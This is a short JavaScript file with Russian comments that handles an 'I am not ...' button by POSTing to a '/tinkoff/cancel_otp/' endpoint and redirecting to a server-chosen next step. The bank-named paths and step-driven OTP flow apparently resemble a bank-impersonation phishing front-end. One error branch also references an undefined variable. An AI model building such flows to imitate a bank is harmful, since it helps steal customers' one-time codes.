document.addEventListener("DOMContentLoaded", () => {
    // Извлечение имени пользователя
    const userNameElement = document.getElementById("form-title");
    const userName = userNameElement ? userNameElement.dataset.name : "Пользователь"; 

    // Обработчик для кнопки "Я не ..."
    document.getElementById("reset-button").addEventListener("click", async (event) => {
        showGlobalLoader();

        try {
            const response = await fetch("/tinkoff/cancel_otp/", {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' }
            });

            if (!response.ok) {
                hideGlobalLoader();
                if (response.status === 307) {
                    showSessionExpiredModal(response.statusText);
                }
                else {
                    showError(response.statusText);
                    console.error('Ошибка:', error);
                }
                return;
            }
            
            const data = await response.json();
            
            if (data.status === 'success') {
                const pageType = data.next_page_type;
                window.location.href = `/tinkoff/next/?step=${pageType}`;
            } 
        } catch (error) {
            showError('Ошибка сети. Попробуйте снова.');
            console.error('Ошибка:', error);
        } finally {
            hideGlobalLoader();
        }
    });
});